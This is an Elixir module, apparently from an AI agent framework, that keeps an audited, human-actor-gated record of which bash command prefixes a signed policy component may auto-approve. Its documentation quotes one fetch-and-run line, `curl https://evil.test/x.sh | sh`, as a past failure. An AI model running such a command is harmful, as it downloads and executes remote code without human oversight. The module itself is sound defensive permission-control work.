defmodule Ouroboros.Control.PolicyPromotion do
  @moduledoc """
  The durable record of what a signed policy component has *earned* the right to resolve
  (docs/SELF.md §S2, S-D22, S-D27).

  `Ouroboros.Wasm.PolicyEngine` honours a component's `allow` only for a tool named in
  `config :ouroboros, :policy_allowable_tools`, empty by default, because a component asked
  about every call the rules did not decide and honoured unconditionally would be a blanket
  approval channel with a signature on it (docs/WASM.md D20). That list is an operator typing a
  tool name. This module is the other way in, and the only one.

  ## A promotion is per `(policy, tool, shape)`

  Not per tool. A promotion of the *tool* `bash` is the right to resolve every `bash` call this
  node will ever make, and no corpus of past answers is evidence for that: the review of the
  first version of this module promoted a component that answers `allow` to everything on fifty
  harmless approvals, and it then resolved `curl https://evil.test/x.sh | sh` with no human in
  the loop. So what is promoted is a **shape** — a `bash` command prefix such as `mix` or
  `mix test`, the same thing an operator writes as `Bash(mix test *)` — and the earned `allow`
  reaches only the requests that shape covers.

      %{
        policy_name: "no-network-shell",
        component_sha256: "…",
        tools: %{"bash" => %{"mix test" => %{promoted_at: …, seq: 4, actor: "operator:ana",
                                            evidence: %{…}}}},
        demotions: [%{tool: "bash", shape: "mix test", at: …, seq: 9,
                      reason: :human_contradiction, …}]
      }

  A shape is allowable when its promotion's sequence number is greater than every demotion's
  for that `{tool, shape}`. The sequence is the record's own counter rather than the wall
  clock: a promotion and a demotion in the same microsecond would be indistinguishable by
  timestamp, and the direction that mistake falls in is the wide one.

  It holds **one policy**: a name and a component sha256. Promoting for a different name, or
  for the same name at different bytes, is refused until the record is cleared. That is the
  point rather than a simplification — a re-deployed policy is different bytes and has earned
  nothing, and a record that carried a shape across a re-deploy would be a widening nobody
  performed. `allowable_shapes/4` applies **both** gates, so there is one function on the
  permission path that can answer "may this component's `allow` stand", and no caller can hold
  half of the check.

  ## The write discipline, and where it is deliberately asymmetric

  `Ouroboros.Control.Grants`': write the checkpoint, fsync it, and only then acknowledge and
  apply in memory. A checkpoint that fails is not applied and not reported as promoted, so a
  storage fault narrows authority. The uncomfortable half is the same one `Grants` states about
  a revocation: a **demotion** whose checkpoint fails has not happened either, the shape stays
  promoted, and `demote/5` returning an error means exactly that — the caller's next move is to
  retry it or to take the policy out of `config :ouroboros, :wasm_policy`.

  The ledger sits on opposite sides of the two:

    * A **promotion** is two-phase, the discipline `Ouroboros.Effects.Runner` and
      `Ouroboros.Interactive.Task.Shell` hold: `record_started` *before* the checkpoint — a
      ledger that refuses refuses the promotion, because a widening nobody can account for
      afterwards is the thing this lane exists to prevent — and the entry is settled `:ok`
      after the checkpoint is acknowledged, `:failed` when it is refused. A checkpoint whose
      outcome is unknown leaves the entry `:started`, which is this ledger's own word for
      ambiguity and is the honest thing to leave behind.
    * A **demotion** and a **clear** write theirs *after* the checkpoint, and a ledger that
      refuses is logged rather than obeyed. This is `Ouroboros.Control.Permissions`' rule for
      an unrecordable answer, verbatim and for its reason: an allow nobody can account for has
      not been granted, but refusing without an audit entry is still refusing.

  ## What is not here

  No model, no classifier, and no promotion without a named human actor: `promote/7` takes one
  and refuses an empty one. Nothing in this module decides *whether* a shape has earned
  promotion — that is `Ouroboros.Wasm.PolicyEngine.promote/6`, which re-runs the replay against
  the corpus before it calls this, and which is the only supported way in (this module's
  `promote/7` is `@doc false` for that reason). This module holds the answer and the audit.

  Storage comes from `config :ouroboros, :policy_promotion_storage`: ETS in development and
  test, and a synced `Ouroboros.Storage.DurableFile` in production, which `config/runtime.exs`
  names (S4 owns that file). ETS means the record dies with the VM and every shape starts
  unpromoted, which is the safe direction to fail.
  """

  use GenServer

  require Logger

  alias Ouroboros.Agent.EffectLedger

  @store_key {:ouroboros, :policy_promotion, 1}

  # Version 2 is the per-shape record. A version-1 checkpoint held `tools: %{tool => entry}`,
  # which said "this component may resolve every call to this tool" — a claim this build will
  # not make on an operator's behalf, so an older checkpoint stops the authority (`load/2`)
  # rather than being read as either an empty record or a blanket one.
  @checkpoint_version 2

  # How many demotions the record keeps. A demotion is the durable statement that a human
  # contradicted this component, so it is worth keeping many; it is not worth keeping an
  # unbounded list in an object that is fsynced on every write. The newest are kept, and the
  # *current* state of a shape never depends on an evicted one — only demotions newer than a
  # promotion can matter, and a promotion is what a demotion older than it was already answered
  # by.
  @max_demotions 200

  # A shape is a command prefix an operator could have typed as a `Bash(<shape> *)` rule. It is
  # bounded like one and it may not carry a control character: it is written into a checkpoint,
  # a ledger entry and an operator's terminal.
  @max_shape_bytes 128

  @actions [:promote, :demote, :clear]

  @type server :: GenServer.server()
  @type evidence :: %{
          required(:report_sha256) => String.t(),
          required(:decisions) => non_neg_integer(),
          required(:contradictions) => non_neg_integer(),
          optional(:distinct_fingerprints) => non_neg_integer(),
          optional(:distinct_sessions) => non_neg_integer(),
          optional(:would_resolve) => non_neg_integer(),
          optional(:replayed_at) => String.t()
        }
  @type promotion_record :: %{
          policy_name: String.t() | nil,
          component_sha256: String.t() | nil,
          tools: %{String.t() => %{String.t() => map()}},
          demotions: [map()]
        }

  def start_link(opts \\ []) do
    {name, opts} = Keyword.pop(opts, :name, __MODULE__)
    GenServer.start_link(__MODULE__, opts, name: name)
  end

  @doc false
  # Records that `shape` of `tool` has earned an `allow` from `name` at `sha`, on `evidence`,
  # for `actor`.
  #
  # `@doc false` deliberately: the gate is `Ouroboros.Wasm.PolicyEngine.promote/6`, which
  # re-runs the replay and holds it to the thresholds. This function stores what it is handed
  # and judges none of it, so a caller reaching it directly is a caller that has skipped the
  # measurement — S2b's `policy.promote` routes through the engine.
  #
  # Refused when the record already holds a different policy name or different component bytes.
  # Clear it first, deliberately, rather than letting a promotion move the record's identity
  # out from under the shapes already in it.
  @spec promote(
          String.t(),
          String.t(),
          String.t(),
          String.t(),
          evidence(),
          String.t(),
          server()
        ) :: {:ok, promotion_record()} | {:error, term()}
  def promote(name, sha, tool, shape, evidence, actor, server \\ __MODULE__) do
    GenServer.call(server, {:promote, name, sha, tool, shape, evidence, actor})
  catch
    :exit, reason -> {:error, {:policy_promotion_unavailable, reason}}
  end

  @doc """
  Withdraws `shape`'s promotion for `tool` under `name`. Narrowing, and idempotent.

  `reason` is a map: `:reason` (an atom — `:human_contradiction` is the canary's), and
  optionally the `:fingerprint` of the human answer that contradicted the component and the
  `:session_id` it came from. Never the command line: a demotion is a fact about a shape, and
  the digest is what makes it traceable to the `:permission` entry beside it.

  A shape that is not promoted is `:ok` with no write — there is nothing to narrow.
  """
  @spec demote(String.t(), String.t(), String.t(), map(), server()) :: :ok | {:error, term()}
  def demote(name, tool, shape, reason, server \\ __MODULE__) do
    GenServer.call(server, {:demote, name, tool, shape, reason})
  catch
    :exit, reason -> {:error, {:policy_promotion_unavailable, reason}}
  end

  @doc """
  Forgets the whole record: the policy name, the bytes, and every shape promoted under them.

  The one way to point this node's promotion record at a different policy or at re-deployed
  bytes, and it is deliberately a separate act with a named actor on it. It is also the only
  way to stop a promoted policy being consulted at all: `PolicyEngine.configured_policy/0`
  falls back to this record when `config :ouroboros, :wasm_policy` is unset, so un-configuring
  a policy that has been promoted does not turn it off (S-D22, and `PolicyEngine.status/0`
  says which of the two the name came from).
  """
  @spec clear(String.t(), server()) :: :ok | {:error, term()}
  def clear(actor, server \\ __MODULE__) do
    GenServer.call(server, {:clear, actor})
  catch
    :exit, reason -> {:error, {:policy_promotion_unavailable, reason}}
  end

  @doc """
  The shapes of `tool` that `name` at `sha` may currently resolve: promoted, and not demoted
  since.

  **Both gates, in one function.** The record's policy name must be `name` and the record's
  component sha256 must be `sha` — the bytes about to answer — because a promotion is a
  measurement of one component's judgement and a re-deploy under the same name is different
  bytes that have measured nothing. Splitting the two checks across a caller and this module is
  what let the first version of this file be asked "which tools has `name` earned" without the
  bytes being part of the question.

  `[]` for any other name or any other bytes, and `[]` when the authority cannot answer. This is
  read on the permission path, so every failure is the empty list: an authority that cannot
  answer has not widened anything.
  """
  @spec allowable_shapes(String.t(), String.t(), String.t(), server()) :: [String.t()]
  def allowable_shapes(name, sha, tool, server \\ __MODULE__)

  def allowable_shapes(name, sha, tool, server)
      when is_binary(name) and name != "" and is_binary(sha) and sha != "" and is_binary(tool) and
             tool != "" do
    GenServer.call(server, {:allowable_shapes, name, sha, tool})
  catch
    _kind, _reason -> []
  end

  def allowable_shapes(_name, _sha, _tool, _server), do: []

  @doc """
  Everything `name` at `sha` may currently resolve, as `%{tool => [shape]}`.

  The same two gates `allowable_shapes/4` applies, for a caller that wants the whole picture —
  `status/0`, and S2b's `policy.status`. `%{}` when the record is bound to another policy or
  other bytes, and when the authority cannot answer.
  """
  @spec allowable(String.t(), String.t(), server()) :: %{String.t() => [String.t()]}
  def allowable(name, sha, server \\ __MODULE__)

  def allowable(name, sha, server)
      when is_binary(name) and name != "" and is_binary(sha) and sha != "" do
    GenServer.call(server, {:allowable, name, sha})
  catch
    _kind, _reason -> %{}
  end

  def allowable(_name, _sha, _server), do: %{}

  @doc "The policy this record is bound to, `{name, component_sha256}`, or `nil`."
  @spec policy(server()) :: {String.t(), String.t()} | nil
  def policy(server \\ __MODULE__) do
    GenServer.call(server, :policy)
  catch
    _kind, _reason -> nil
  end

  @doc """
  One tick of the shadow-sampling counter for `{tool, shape}` (S-D29).

  Returns how many honoured `allow`s this node has settled on that shape since the counter was
  last reset — the count *including* this one, so the caller's `rem(count, every) == 0` picks
  every Nth. `:error` when the authority cannot answer, which the engine reads as "shadow it":
  a counter nobody can read is not a reason to stop asking.

  Deliberately not durable and deliberately not in the checkpoint. It is a sampling phase, not
  an authority: a restart re-starting the count costs at most one extra shadowed call, and
  fsyncing a counter on the permission path would cost every call.
  """
  @spec shadow_tick(String.t(), String.t(), server()) :: pos_integer() | :error
  def shadow_tick(tool, shape, server \\ __MODULE__)

  def shadow_tick(tool, shape, server) when is_binary(tool) and is_binary(shape) do
    GenServer.call(server, {:shadow_tick, tool, shape})
  catch
    _kind, _reason -> :error
  end

  def shadow_tick(_tool, _shape, _server), do: :error

  @doc "The whole record, its durability, and what is currently allowable."
  @spec status(server()) :: map()
  def status(server \\ __MODULE__) do
    GenServer.call(server, :status)
  catch
    :exit, reason ->
      %{
        durability: :unavailable,
        error: {:policy_promotion_unavailable, reason},
        policy_name: nil,
        component_sha256: nil,
        tools: %{},
        demotions: [],
        allowable: %{},
        allowable_tools: []
      }
  end

  @doc false
  def checkpoint_key, do: @store_key

  @doc false
  @spec checkpoint_version() :: pos_integer()
  def checkpoint_version, do: @checkpoint_version

  @doc "The actions a `:policy_promotion` ledger entry may name."
  @spec actions() :: [atom()]
  def actions, do: @actions

  @doc "The most bytes a shape may be."
  @spec max_shape_bytes() :: pos_integer()
  def max_shape_bytes, do: @max_shape_bytes

  ## ── server ────────────────────────────────────────────────────────────────────────────

  @impl true
  def init(opts) do
    with {:ok, storage} <- storage_config(opts),
         {:ok, adapter, adapter_opts} <- normalize_storage(storage),
         {:ok, record, seq} <- load(adapter, adapter_opts) do
      {:ok,
       %{
         adapter: adapter,
         opts: adapter_opts,
         ledger: Keyword.get(opts, :ledger, EffectLedger),
         record: record,
         seq: seq,
         shadow: %{},
         durability: durability_level(adapter)
       }}
    else
      {:error, reason} -> {:stop, reason}
    end
  end

  @impl true
  def handle_call({:promote, name, sha, tool, shape, evidence, actor}, _from, state) do
    with {:ok, name} <- policy_name(name),
         {:ok, sha} <- component_sha(sha),
         {:ok, tool} <- tool_name(tool),
         {:ok, shape} <- shape_name(shape),
         {:ok, actor} <- actor_name(actor),
         {:ok, evidence} <- evidence(evidence),
         :ok <- bound_to(state.record, name, sha),
         # The ledger first, and a refusal here is the promotion's refusal: a widening nobody
         # can account for afterwards has not been earned. It is `started` rather than settled
         # because the checkpoint has not happened yet, and an audit trail that says a
         # promotion landed before it landed is the one this entry exists to not be.
         {:ok, effect_id} <-
           ledger_started(state, :promote, name, sha, tool, shape, actor, evidence) do
      seq = state.seq + 1

      shapes =
        state.record.tools
        |> Map.get(tool, %{})
        |> Map.put(shape, %{promoted_at: now(), seq: seq, actor: actor, evidence: evidence})

      record = %{
        state.record
        | policy_name: name,
          component_sha256: sha,
          tools: Map.put(state.record.tools, tool, shapes)
      }

      case persist(record, seq, {:ok, record}, state) do
        {:reply, {:ok, _record} = reply, applied} ->
          _ =
            ledger_settle(applied, effect_id, :ok, %{
              decisions: evidence.decisions,
              contradictions: evidence.contradictions,
              distinct_fingerprints: evidence.distinct_fingerprints,
              distinct_sessions: evidence.distinct_sessions,
              would_resolve: evidence.would_resolve,
              report_sha256: evidence.report_sha256
            })

          {:reply, reply, %{applied | shadow: Map.delete(applied.shadow, {tool, shape})}}

        {:reply, {:error, reason} = refusal, unchanged} ->
          _ = ledger_settle(unchanged, effect_id, :failed, %{}, reason)
          {:reply, refusal, unchanged}

        # The checkpoint's outcome is unknown and this authority is stopping. The entry stays
        # `:started`, which is exactly what the ledger calls an effect whose owner went away
        # without settling it — settling it either way here would be inventing an outcome.
        other ->
          other
      end
    else
      {:error, reason} -> {:reply, {:error, reason}, state}
    end
  end

  def handle_call({:demote, name, tool, shape, reason}, _from, state) do
    with {:ok, name} <- policy_name(name),
         {:ok, tool} <- tool_name(tool),
         {:ok, shape} <- shape_name(shape),
         {:ok, reason} <- demotion_reason(reason) do
      cond do
        state.record.policy_name != name ->
          # Nothing to narrow: this record is not that policy's. Said as `:ok` rather than as an
          # error because a caller narrowing something that is already not there has got what
          # it asked for.
          {:reply, :ok, state}

        not promoted?(state.record, tool, shape) ->
          {:reply, :ok, state}

        true ->
          seq = state.seq + 1

          demotion =
            reason
            |> Map.merge(%{tool: tool, shape: shape, at: now(), seq: seq})
            |> Map.take([:tool, :shape, :at, :seq, :reason, :fingerprint, :session_id])

          record = %{
            state.record
            | demotions: Enum.take([demotion | state.record.demotions], @max_demotions)
          }

          # The checkpoint first, then the ledger: a narrowing an audit failure could block is
          # a narrowing that fails open.
          case persist(record, seq, :ok, state) do
            {:reply, :ok, applied} ->
              _ =
                ledger_write(
                  applied,
                  :demote,
                  name,
                  applied.record.component_sha256,
                  tool,
                  shape,
                  Map.get(reason, :session_id) || "runtime",
                  Map.take(demotion, [:reason, :fingerprint, :session_id])
                )

              {:reply, :ok, %{applied | shadow: Map.delete(applied.shadow, {tool, shape})}}

            other ->
              other
          end
      end
    else
      {:error, reason} -> {:reply, {:error, reason}, state}
    end
  end

  def handle_call({:clear, actor}, _from, state) do
    with {:ok, actor} <- actor_name(actor) do
      previous = state.record

      case persist(empty_record(), state.seq + 1, :ok, state) do
        {:reply, :ok, applied} ->
          _ =
            ledger_write(
              applied,
              :clear,
              previous.policy_name,
              previous.component_sha256,
              nil,
              nil,
              actor,
              %{}
            )

          {:reply, :ok, %{applied | shadow: %{}}}

        other ->
          other
      end
    else
      {:error, reason} -> {:reply, {:error, reason}, state}
    end
  end

  def handle_call({:allowable_shapes, name, sha, tool}, _from, state),
    do: {:reply, shapes_of(state.record, name, sha, tool), state}

  def handle_call({:allowable, name, sha}, _from, state),
    do: {:reply, allowable_map(state.record, name, sha), state}

  def handle_call({:shadow_tick, tool, shape}, _from, state) do
    count = Map.get(state.shadow, {tool, shape}, 0) + 1
    {:reply, count, %{state | shadow: Map.put(state.shadow, {tool, shape}, count)}}
  end

  def handle_call(:policy, _from, state) do
    reply =
      case state.record do
        %{policy_name: name, component_sha256: sha} when is_binary(name) and is_binary(sha) ->
          {name, sha}

        _unbound ->
          nil
      end

    {:reply, reply, state}
  end

  def handle_call(:status, _from, state) do
    allowable =
      allowable_map(state.record, state.record.policy_name, state.record.component_sha256)

    {:reply,
     %{
       durability: state.durability,
       policy_name: state.record.policy_name,
       component_sha256: state.record.component_sha256,
       tools: state.record.tools,
       demotions: state.record.demotions,
       allowable: allowable,
       # Derived, and named that way in `docs/SELF.md` §S2: the tools with at least one shape
       # still standing. It is a summary for a reader, never a gate — the gate is a shape.
       allowable_tools: allowable |> Map.keys() |> Enum.sort()
     }, state}
  end

  # `Ouroboros.Control.Grants.persist/3`, verbatim in its three outcomes: a definite pre-commit
  # failure leaves memory alone, and post-rename ambiguity stops this authority rather than
  # letting it continue beside a checkpoint it cannot describe.
  defp persist(record, seq, reply, state) do
    case adapter_call(state.adapter, :put_checkpoint, [
           @store_key,
           checkpoint(record, seq),
           state.opts
         ]) do
      :ok ->
        {:reply, reply, %{state | record: record, seq: seq}}

      {:error, {:commit_outcome_unknown, _reason} = ambiguity} ->
        {:stop, ambiguity, {:error, {:policy_promotion_commit_outcome_unknown, ambiguity}}, state}

      {:error, reason} ->
        {:reply, {:error, {:policy_promotion_checkpoint_failed, reason}}, state}

      other ->
        {:reply, {:error, {:invalid_policy_promotion_storage_response, other}}, state}
    end
  end

  ## ── the record ────────────────────────────────────────────────────────────────────────

  defp empty_record,
    do: %{policy_name: nil, component_sha256: nil, tools: %{}, demotions: []}

  # A shape is allowable when it is promoted for *this* name at *these bytes* and nothing has
  # demoted it since. `nil` is neither a name nor a digest: an unbound record allows nothing.
  defp shapes_of(record, name, sha, tool) do
    if bound?(record, name, sha) do
      record.tools
      |> Map.get(tool, %{})
      |> Enum.filter(fn {shape, %{seq: promoted}} ->
        promoted > newest_demotion(record.demotions, tool, shape)
      end)
      |> Enum.map(&elem(&1, 0))
      |> Enum.sort()
    else
      []
    end
  end

  defp allowable_map(record, name, sha) do
    if bound?(record, name, sha) do
      record.tools
      |> Enum.map(fn {tool, _shapes} -> {tool, shapes_of(record, name, sha, tool)} end)
      |> Enum.reject(fn {_tool, shapes} -> shapes == [] end)
      |> Map.new()
    else
      %{}
    end
  end

  defp bound?(%{policy_name: bound_name, component_sha256: bound_sha}, name, sha)
       when is_binary(name) and name != "" and is_binary(sha) and sha != "",
       do: bound_name == name and bound_sha == sha

  defp bound?(_record, _name, _sha), do: false

  defp promoted?(record, tool, shape),
    do: record.tools |> Map.get(tool, %{}) |> Map.has_key?(shape)

  defp newest_demotion(demotions, tool, shape) do
    demotions
    |> Enum.filter(&(Map.get(&1, :tool) == tool and Map.get(&1, :shape) == shape))
    |> Enum.map(&Map.get(&1, :seq, 0))
    |> then(&Enum.max([0 | &1]))
  end

  defp bound_to(%{policy_name: nil, component_sha256: nil}, _name, _sha), do: :ok

  defp bound_to(%{policy_name: name, component_sha256: sha}, name, sha), do: :ok

  defp bound_to(%{policy_name: bound, component_sha256: sha}, _name, _sha),
    do: {:error, {:policy_promotion_bound_to, bound, sha}}

  ## ── validation ────────────────────────────────────────────────────────────────────────

  # The same charset every lane-W name is written in, so a record cannot hold a name no
  # register row could ever match.
  defp policy_name(name) when is_binary(name) and name != "" do
    if Ouroboros.Wasm.Artifact.name?(name),
      do: {:ok, name},
      else: {:error, {:invalid_policy_name, name}}
  end

  defp policy_name(other), do: {:error, {:invalid_policy_name, other}}

  defp component_sha(<<sha::binary-size(64)>>) do
    if String.match?(sha, ~r/\A[0-9a-f]{64}\z/),
      do: {:ok, sha},
      else: {:error, {:invalid_component_sha256, sha}}
  end

  defp component_sha(other), do: {:error, {:invalid_component_sha256, other}}

  defp tool_name(tool) when is_binary(tool) and tool != "" and byte_size(tool) <= 128,
    do: {:ok, tool}

  defp tool_name(other), do: {:error, {:invalid_promoted_tool, other}}

  # A command prefix, held to what an operator could have written in a rule: valid UTF-8, no
  # control or format character, no leading or trailing space (a shape is compared to a
  # normalised sub-command, and `"ls "` would never equal one), and bounded.
  defp shape_name(shape)
       when is_binary(shape) and shape != "" and byte_size(shape) <= @max_shape_bytes do
    cond do
      not String.valid?(shape) ->
        {:error, {:invalid_promoted_shape, shape}}

      String.trim(shape) != shape ->
        {:error, {:invalid_promoted_shape, shape}}

      String.match?(shape, ~r/[\p{Cc}\p{Cf}\p{Zl}\p{Zp}]/u) ->
        {:error, {:invalid_promoted_shape, shape}}

      true ->
        {:ok, shape}
    end
  end

  # The refused value travels back so an operator can see what they typed, bounded the way the
  # shape itself is bounded.
  defp shape_name(shape) when is_binary(shape),
    do:
      {:error,
       {:invalid_promoted_shape, binary_part(shape, 0, min(byte_size(shape), @max_shape_bytes))}}

  defp shape_name(other), do: {:error, {:invalid_promoted_shape, describe(other)}}

  # A promotion has a human's name on it. Not a shape this module interprets — an operator id, a
  # session, a person — but present, because "promotion without a human actor" is the one thing
  # this lane is not for.
  defp actor_name(actor) when is_binary(actor) and actor != "" and byte_size(actor) <= 256,
    do: {:ok, actor}

  defp actor_name(other), do: {:error, {:invalid_promotion_actor, other}}

  defp evidence(evidence) when is_map(evidence) and not is_struct(evidence) do
    with sha when is_binary(sha) and sha != "" <- Map.get(evidence, :report_sha256),
         decisions when is_integer(decisions) and decisions >= 0 <- Map.get(evidence, :decisions),
         contradictions when is_integer(contradictions) and contradictions >= 0 <-
           Map.get(evidence, :contradictions) do
      {:ok,
       %{
         report_sha256: sha,
         decisions: decisions,
         contradictions: contradictions,
         distinct_fingerprints: counted(Map.get(evidence, :distinct_fingerprints)),
         distinct_sessions: counted(Map.get(evidence, :distinct_sessions)),
         would_resolve: counted(Map.get(evidence, :would_resolve)),
         replayed_at: replayed_at(Map.get(evidence, :replayed_at))
       }}
    else
      _malformed -> {:error, {:invalid_promotion_evidence, Map.keys(evidence) |> Enum.sort()}}
    end
  end

  defp evidence(other), do: {:error, {:invalid_promotion_evidence, describe(other)}}

  defp counted(value) when is_integer(value) and value >= 0, do: value
  defp counted(_absent), do: 0

  defp replayed_at(at) when is_binary(at) and at != "", do: at
  defp replayed_at(_absent), do: now()

  defp demotion_reason(reason) when is_map(reason) and not is_struct(reason) do
    {:ok,
     %{
       reason: atom_or(Map.get(reason, :reason), :unstated),
       fingerprint: digest_or_nil(Map.get(reason, :fingerprint)),
       session_id: identity_or_nil(Map.get(reason, :session_id))
     }}
  end

  defp demotion_reason(_other), do: {:error, :invalid_demotion_reason}

  defp atom_or(value, _default) when is_atom(value) and not is_nil(value), do: value
  defp atom_or(_value, default), do: default

  defp digest_or_nil(<<digest::binary-size(64)>>) do
    if String.match?(digest, ~r/\A[0-9a-f]{64}\z/), do: digest, else: nil
  end

  defp digest_or_nil(_value), do: nil

  defp identity_or_nil(value) when is_binary(value) and value != "" and byte_size(value) <= 256,
    do: value

  defp identity_or_nil(_value), do: nil

  ## ── the ledger ────────────────────────────────────────────────────────────────────────

  defp ledger_started(state, action, name, sha, tool, shape, actor, evidence) do
    attrs = ledger_attrs(action, name, sha, tool, shape, actor)

    case EffectLedger.record_started(attrs, state.ledger) do
      {:ok, _entry, _disposition} ->
        {:ok, attrs.id}

      {:error, reason} ->
        Logger.warning(
          "policy #{action} not recorded in the effect ledger: #{inspect(reason)}; " <>
            "policy=#{inspect(name)} tool=#{inspect(tool)} shape=#{inspect(shape)} " <>
            "evidence=#{inspect(Map.take(evidence, [:report_sha256]))}"
        )

        {:error, {:policy_promotion_unrecordable, reason}}
    end
  end

  defp ledger_settle(state, effect_id, status, result, error \\ nil) do
    outcome = %{status: status, result: result, error: error}

    case EffectLedger.settle(effect_id, outcome, state.ledger) do
      {:ok, _entry, _disposition} ->
        :ok

      {:error, reason} ->
        # The promotion has already been checkpointed and acknowledged by the time this runs, so
        # the entry stays `:started` — the ledger's own word for "an outcome nobody wrote down".
        Logger.warning(
          "policy promotion #{effect_id} could not be settled in the effect ledger " <>
            "(#{inspect(reason)}); the entry stays started"
        )

        {:error, {:policy_promotion_unsettleable, reason}}
    end
  end

  defp ledger_write(state, action, name, sha, tool, shape, actor, result) do
    attrs =
      action
      |> ledger_attrs(name, sha, tool, shape, actor)
      |> Map.put(:result, result)

    case EffectLedger.record_settled(attrs, state.ledger) do
      {:ok, _entry, _disposition} ->
        :ok

      {:error, reason} ->
        Logger.warning(
          "policy #{action} not recorded in the effect ledger: #{inspect(reason)}; " <>
            "policy=#{inspect(name)} tool=#{inspect(tool)} shape=#{inspect(shape)}"
        )

        {:error, {:policy_promotion_unrecordable, reason}}
    end
  end

  defp ledger_attrs(action, name, sha, tool, shape, actor) do
    %{
      id: "polprom_" <> Base.url_encode64(:crypto.strong_rand_bytes(12), padding: false),
      effect: :policy_promotion,
      principal: actor,
      attempt: %{
        policy_name: name,
        tool: tool,
        shape: shape,
        action: action,
        component_sha256: sha,
        actor: actor,
        node: node()
      },
      authority: %{decision: action, reason: nil},
      cause: %{signal_id: to_string(action), signal_type: "policy_promotion"}
    }
  end

  ## ── configuration and storage ─────────────────────────────────────────────────────────

  defp checkpoint(record, seq),
    do: %{version: @checkpoint_version, record: record, seq: seq}

  defp load(adapter, adapter_opts) do
    case adapter_call(adapter, :get_checkpoint, [@store_key, adapter_opts]) do
      :not_found ->
        {:ok, empty_record(), 0}

      {:ok, %{version: @checkpoint_version, record: record, seq: seq}}
      when is_map(record) and is_integer(seq) and seq >= 0 ->
        if valid_record?(record),
          do: {:ok, record, seq},
          else: {:error, :invalid_policy_promotion_checkpoint}

      # A checkpoint this build cannot interpret is preserved, not overwritten, and never read
      # as an empty record — the empty record is narrow, but writing over a record an operator
      # can still read is not this module's to do. A version-1 record is one of these: it holds
      # tool-level promotions, which this build will not translate into shapes on anybody's
      # behalf.
      {:ok, %{version: version}} ->
        {:error, {:unsupported_policy_promotion_checkpoint, version}}

      {:ok, _invalid} ->
        {:error, :invalid_policy_promotion_checkpoint}

      {:error, reason} ->
        {:error, {:policy_promotion_checkpoint_unreadable, reason}}

      other ->
        {:error, {:invalid_policy_promotion_storage_response, other}}
    end
  end

  defp valid_record?(%{
         policy_name: name,
         component_sha256: sha,
         tools: tools,
         demotions: demotions
       })
       when is_map(tools) and is_list(demotions) do
    (is_nil(name) or is_binary(name)) and (is_nil(sha) or is_binary(sha)) and
      Enum.all?(tools, fn {tool, shapes} ->
        is_binary(tool) and is_map(shapes) and
          Enum.all?(shapes, fn {shape, entry} ->
            is_binary(shape) and is_map(entry) and is_integer(Map.get(entry, :seq))
          end)
      end) and
      Enum.all?(demotions, fn demotion ->
        is_map(demotion) and is_integer(Map.get(demotion, :seq)) and
          is_binary(Map.get(demotion, :shape))
      end)
  end

  defp valid_record?(_other), do: false

  defp storage_config(opts) do
    case Keyword.fetch(opts, :storage) do
      {:ok, storage} ->
        {:ok, storage}

      :error ->
        case Application.get_env(:ouroboros, :policy_promotion_storage) do
          nil -> {:ok, {Jido.Storage.ETS, table: :ouroboros_policy_promotion}}
          storage -> {:ok, storage}
        end
    end
  end

  defp normalize_storage(storage) do
    {adapter, adapter_opts} = Jido.Storage.normalize_storage(storage)
    {:ok, adapter, adapter_opts}
  rescue
    error -> {:error, {:invalid_policy_promotion_storage, Exception.message(error)}}
  end

  defp adapter_call(adapter, function, arguments) do
    apply(adapter, function, arguments)
  rescue
    error -> {:error, {:adapter_exception, Exception.message(error)}}
  catch
    kind, reason -> {:error, {:adapter_failure, kind, inspect(reason)}}
  end

  defp durability_level(Jido.Storage.ETS), do: :ephemeral_checkpoint
  defp durability_level(Ouroboros.Storage.DurableFile), do: :synced_checkpoint
  defp durability_level(_adapter), do: :durable_checkpoint

  defp describe(term), do: inspect(term, limit: 10, printable_limit: 200)

  defp now, do: DateTime.utc_now() |> DateTime.to_iso8601()
end
